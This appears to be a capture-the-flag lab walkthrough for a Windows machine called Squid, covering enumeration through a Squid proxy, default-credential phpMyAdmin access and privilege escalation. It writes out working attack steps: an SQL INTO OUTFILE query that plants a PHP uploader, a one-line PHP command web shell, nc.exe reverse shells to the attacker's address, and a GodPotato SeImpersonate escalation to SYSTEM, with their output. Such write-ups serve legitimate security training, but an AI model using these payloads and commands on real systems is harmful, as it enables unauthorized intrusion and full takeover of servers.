##### Tags: `proxy`  `port 3128`  `GodPotato` `SeImpersonatePrivilege` `Wamp`

# 🪟 Squid 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.220.189

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 135,139,445 are rpc and smb service but not able to connect  
port 3128 is running proxy 4.14  
```console
if we go to http://192.168.220.189:3128, it says error because it connected to the proxy
```
we use foxyproxy to create a proxy for 192.168.220.189 port 3128  
then we go to http://192.168.220.189:3128 again, it still fail  
but we can try other common port like 80,443,8080  
we found 8080 is running Wampserver  

there is a phpmyadmin login page  
use default credential root null logged in successfully  
we can create a upload php using SQL query
```console
https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
```
```console
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```
we go to http://192.168.220.189:8080/uploader.php/ to upload a simple cmd shell
```console
<?php system($_REQUEST["cmd"]); ?>
```
```console
http://192.168.220.189:8080/shell.php?cmd=whoami

nt authority\local service
```
we now have RCE, upload nc.exe and get the reverse shell
```console
$ penelope -p 3128         
[+] Listening for reverse shells on 0.0.0.0:3128 →  127.0.0.1 • 10.0.2.15 • 192.168.45.180
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from  192.168.220.189 WINDOWS 👤 nt authority\local service • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/192.168.220.189-WINDOWS/2026_03_29-21_36_52-629.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\wamp\www>whoami

nt authority\local service
```
## Privilege Escalation
we have SeImpersonatePrivilege
```console
C:\Users>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeSystemtimePrivilege         Change the system time                    Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
upload potato and nc.exe
```console
C:\Users\Public\Downloads>dir

 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\Users\Public\Downloads

03/29/2026  03:41 AM    <DIR>          .
03/29/2026  03:41 AM    <DIR>          ..
03/29/2026  03:40 AM            57,344 GodPotato-NET4.exe
03/29/2026  03:40 AM            59,392 nc.exe
03/29/2026  03:41 AM        10,156,032 winPEASx64.exe
               3 File(s)     10,272,768 bytes
               2 Dir(s)  11,566,092,288 bytes free

```
run the potato
```console
C:\Users\Public\Downloads>GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.180 445"
GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.180 445"
[*] CombaseModule: 0x140716496125952
[*] DispatchTable: 0x140716498439360
[*] UseProtseqFunction: 0x140716497816624
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\645e3068-b782-4666-a893-43ca0e2c74ce\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00001402-0f58-ffff-c811-fe7281cf7d12
[*] DCOM obj OXID: 0x7d1ecf717cbe0431
[*] DCOM obj OID: 0xc949b579805ddfda
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 872 Token:0x628  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4788
```
we got system shell
```console
$ penelope -p 445          
[+] Listening for reverse shells on 0.0.0.0:445 →  127.0.0.1 • 10.0.2.15 • 192.168.45.180
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from SQUID 192.168.220.189 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 nt authority\system • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/SQUID~192.168.220.189-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_03_29-21_41_59-941.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Users\Public\Downloads>whoami

nt authority\system
```
